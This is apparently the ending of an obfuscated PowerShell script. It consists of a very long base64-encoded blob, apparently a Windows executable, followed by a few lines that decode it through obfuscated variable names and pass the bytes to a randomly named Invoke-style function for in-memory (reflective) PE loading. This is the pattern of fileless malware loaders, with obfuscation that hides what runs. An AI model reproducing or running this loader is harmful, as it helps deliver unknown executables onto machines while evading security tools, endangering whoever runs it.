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8zpTMoNJw0HDVaNWM1gTXzNcA27zb4Nk43Vzc0OD84UjhmOCg5MTk9OkY6Mjt8O4U7rTsHPD48hjwqPRw+Ij4mPis+MT41Pjs+Pz5FPkk+Tj5UPlg+Xj5iPmg+bD5yPnY+6j5hP30/xz/TP/o/AAAA8AAAYAAAABAwIzBFMEwwmDCsMPAw+TA4MUIxXTEGMjwyhDKTMrIy1zJOM3A0eDQgNrI2vjZMN1Q3YDdvN/s3EjhJOMA44jnqOZI7JDwwPL48xjzSPOE8bT2EPb49Rj4AAAEAMAAAAKYxuDEsNTA1NDU4NTw1QDVENUg1TDVQNVQ1WDU7OpI61TqPPFA9AAAAEAEAjAAAACQwWzBxMJcwETFOMVgxdzHHMdgx7DHyMfcxJDXDNes1+TWlN8M33DfjN+s38Df0N/g3IThHOGU4bDhwOHQ4eDh8OIA4hDiIONI42DjcOOA45DhKOVU5cDl3OXw5gDmEOaU5zzkBOgg6DDoQOhQ6GDocOiA6JDpuOnQ6eDp8OoA69jumPgAgAQAkAAAAljBUMW0xfDGdMdUxMjJuPKU+sD7APvI+Gj8gPwAwAQAkAAAAuDK8MsAyxDLQMtQy2DLwMvQy+DL8MuA/5D/8PwBAAQCYAwAABDAMMBQwHDAkMCwwNDA8MEQwTDBUMFwwZDBsMHQwfDCEMIwwlDCcMKQwrDC0MLwwxDDMMNQw3DDkMOww9DD8MAQxDDEUMRwxJDEsMTQxPDFEMUwxVDFcMWQxbDF0MXwxhDGMMZQxnDGkMawxtDG8McQxzDHUMdwx5DHsMfQx/DEEMgwyFDIcMiQyLDI0MjwyRDJMMlQyXDJkMmwydDJ8MoQyjDKUMpwypDKsMrQyvDLEMswy1DLcMuQy7DL0MvwyBDMMMxQzHDMkMywzNDM8M0QzTDNUM1wzZDNsM3QzfDOEM4wzlDOcM6QzrDO0M7wzxDPMM9Qz3DPkM+wz9DP8MwQ0DDQUNBw0JDQsNDQ0PDRENEw0VDRcNGQ0bDR0NHw0hDSMNJQ0nDSkNKw0tDS8NMQ0zDTUNNw05DTsNPQ0/DQENQw1FDUcNSQ1LDU0NTw1RDVMNVQ1XDVkNWw1dDV8NYQ1jDWUNZw1pDWsNbQ1vDXENcw11DXcNeQ17DX0Nfw1BDYMNhQ2HDYkNiw2NDY8NkQ2TDZUNlw2ZDZsNnQ2fDaENow2lDacNqQ2rDa0Nrw2xDbMNtQ23DbkNuw29Db8NgQ3DDcUNxg3IDcoNzA3ODdAN0g3UDdYN2A3aDdwN3g3gDeIN5A3mDegN6g3sDe4N8A3yDfQN9g34DfoN/A3+DcAOAg4EDgYOCA4KDgwODg4QDhIOFA4WDhgOGg4cDh4OIA4iDiQOJg4oDioOLA4uDjAOMg40DjYOOA46DjwOPg4ADkIORA5GDkgOSg5MDk4OUA5SDlQOVg5YDloOXA5eDmAOYg5kDmYOaA5qDmwObg5wDnIOdA52DngOeg58Dn4OQA6CDoQOhg6IDooOjA6ODpAOkg6UDpYOmA6aDpwOng6gDqIOpA6mDqgOqg6sDq4OsA6yDrQOtg64DroOvA6+DoAOwg7EDsYOyA7KDswOzg7QDtIO1A7WDtgO2g7cDt4O4A7iDuQO5g7oDuoO7A7uDvAO8g70DvYO+A76DvwO/g7ADwIPBA8GDwgPCg8MDw4PEA8SDxQPFg8YDxoPHA8eDyAPIg8kDyYPKA8qDywPLg8wDzIPNA82DzgPOg88Dz4PAA9CD0QPRg9ID0oPTA9OD1APUg9UD1YPWA9aD1wPXg9gD2IPZA9mD2gPag9sD24PcA9yD3QPdg94D3oPfA9+D0APgg+ED4YPiA+KD4wPgAAAGABADgAAAA0MDwwRDBMMFQwXDBkMGwwdDB8MIQwjDCUMJwwpDCsMLQwvDDEMMww1DDcMOQwCDsAcAEAFAAAAPAx9DH4MfwxEDIAAACAAQA0AAAATDiAOKA4wDjgOOw4CDkoOUg5ZDloOYg5lDmwOdA58DkQOjA6UDpsOnA6AAAAoAEAFAEAADQ0ODU8NUA1RDVINUw1UDVUNVg1XDVgNWQ1aDVsNXA1dDV4NXw1gDWENYg1jDWQNZQ1mDWcNaA1pDWoNaw1sDW0Nbg1vDXANcQ1yDXMNdA11DXYNdw14DXsNfA19DX4Nfw1ADYENgg2DDYQNhQ2GDYcNiA2JDYoNiw2MDY0Njg2PDZANkQ2SDZMNlA2VDZYNlw2YDZkNmg2bDZwNnQ2eDZ8NoA2hDaINow2kDaUNpg2nDbENtQ25Db0NgQ3JDcwNzQ3ODc8N1w3gDiIOIw4kDiUOJg4nDigOKQ4qDisOLg4vDjAOMQ4yDjMONA41DhcOmA6cDp0Ong6fDqAOoQ6iDqMOpA6lDqoOrA6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
 [Byte[]]${PeByTes} = [Byte[]] $J1v::'FromBase64String'.Invoke(${peBYteS32})
 &'Invoke-RFBUXMEHAEMZBHI' -PEBytes ${peByTEs}
 
 }
